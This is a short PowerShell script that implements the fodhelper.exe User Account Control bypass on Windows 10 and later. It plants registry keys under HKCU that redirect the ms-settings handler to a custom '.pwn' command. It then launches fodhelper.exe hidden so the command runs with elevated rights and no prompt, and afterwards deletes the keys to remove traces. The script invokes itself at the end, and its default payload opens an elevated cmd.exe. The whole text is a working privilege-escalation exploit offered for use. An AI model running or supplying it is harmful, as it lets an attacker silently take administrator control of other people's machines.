function Check-System {
    $osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Version
    if ($osVersion -ge "10.0") {
        return $true
    } else {
        return $false
    }
}

function Bypass {
    Param (
        [String]$program = "cmd /c start cmd.exe"
    )

    if (-not (Check-System)) {
        $osName = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Write-Error "Not applicable on $osName"
        return
    }

    try {
        # Create registry keys and set values
        New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force | Out-Null
        Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

        New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force | Out-Null
        Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force

        # Start fodhelper.exe to trigger the UAC bypass
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

        # Give it a few seconds to execute
        Start-Sleep 3
    }
    catch {
        Write-Error "An error occurred: $_"
    }
    finally {
        # Clean up the registry
        Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Run the function
Bypass
